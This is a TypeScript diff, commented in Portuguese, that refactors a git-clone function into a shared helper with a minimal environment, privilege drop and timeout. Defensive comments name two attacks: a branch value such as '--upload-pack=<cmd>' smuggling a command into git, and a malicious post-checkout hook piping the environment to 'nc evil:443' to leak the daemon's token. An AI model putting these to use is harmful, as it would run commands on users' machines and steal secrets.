@@ -1,9 +1,10 @@
 import { spawnSync } from "node:child_process";
 import { existsSync, statSync, accessSync, constants as fsConsts, mkdirSync, chownSync, rmSync, readdirSync, realpathSync } from "node:fs";
 import path from "node:path";
+import { runGit, RUN_GIT_CLONE_TIMEOUT_MS } from "./runners/run-git.js";
 import os from "node:os";
 import type { RepoSummary as Repo } from "./types.js";
-import { spawnDropped, type DropTarget } from "./privileges.js";
+import { type DropTarget } from "./privileges.js";
 
 const FORBIDDEN_PATHS = new Set([os.homedir(), "/", "/etc", "/usr", "/bin", "/sbin", "/var", "/opt", "/dev"]);
 const SKIP_SCAN_DIRS = new Set([
@@ -362,42 +363,26 @@ export async function cloneRepoIfMissing(basePath: string, repo: Repo, drop: Dro
   return await runGitClone(repo.gitUrl, target, repo.defaultBranch, drop);
 }
 
-function runGitClone(gitUrl: string, target: string, branch: string | undefined, drop: DropTarget | null): Promise<CloneResult> {
-  return new Promise((resolve) => {
-    const args = ["clone"];
-    if (branch) {
-      // Re-valida defensivamente — branch chega como --branch <X> antes do
-      // separador `--`, então um leading `-` é tratado como flag pelo git
-      // (e.g. --upload-pack=<cmd> = RCE local via clone).
-      try { validateGitRef(branch, "branch"); }
-      catch (e) {
-        resolve({ repoName: path.basename(target), ok: false, message: (e as Error).message });
-        return;
-      }
-      args.push("--branch", branch);
+async function runGitClone(gitUrl: string, target: string, branch: string | undefined, drop: DropTarget | null): Promise<CloneResult> {
+  const repoName = path.basename(target);
+  const args = ["clone"];
+  if (branch) {
+    // Re-valida defensivamente — branch chega como --branch <X> antes do
+    // separador `--`, então um leading `-` é tratado como flag pelo git
+    // (e.g. --upload-pack=<cmd> = RCE local via clone).
+    try { validateGitRef(branch, "branch"); }
+    catch (e) {
+      return { repoName, ok: false, message: (e as Error).message };
     }
-    args.push("--", gitUrl, target);
-    // Env enxuto: NÃO espalha process.env. Repo malicioso pode ter
-    // .git/hooks/post-checkout que ecoa env (`env | nc evil:443`).
-    // Sem essa proteção, THE_DUDES_DAEMON_TOKEN + outras secrets do
-    // daemon process vazam pro hook. Só passa o mínimo essencial.
-    const minimalEnv = gitMinimalEnv(drop);
-    const proc = spawnDropped("git", args, {
-      stdio: ["ignore", "pipe", "pipe"],
-      env: minimalEnv,
-    }, drop);
-    let stderr = "";
-    proc.stderr!.setEncoding("utf8");
-    proc.stderr!.on("data", (c: string) => { stderr += c; });
-    proc.on("close", (code) => {
-      const repoName = path.basename(target);
-      if (code === 0) resolve({ repoName, ok: true, message: "cloned" });
-      else resolve({ repoName, ok: false, message: stderr.trim().slice(0, 500) || `git clone exited ${code}` });
-    });
-    proc.on("error", (e) => {
-      resolve({ repoName: path.basename(target), ok: false, message: (e as Error).message });
-    });
-  });
+    args.push("--branch", branch);
+  }
+  args.push("--", gitUrl, target);
+  // R8 (T-463): helper central (env mínimo + spawnDropped + timeout de grupo);
+  // clone tem teto próprio (repo grande).
+  const r = await runGit(process.cwd(), args, { drop, timeoutMs: RUN_GIT_CLONE_TIMEOUT_MS });
+  if (r.timedOut) return { repoName, ok: false, message: `git clone timeout após ${RUN_GIT_CLONE_TIMEOUT_MS / 1000}s` };
+  if (r.ok) return { repoName, ok: true, message: "cloned" };
+  return { repoName, ok: false, message: r.stderr.slice(0, 500) || `git clone exited ${r.status}` };
 }
 
 export async function cloneAllRepos(basePath: string, repos: Repo[], drop: DropTarget | null = null): Promise<CloneResult[]> {
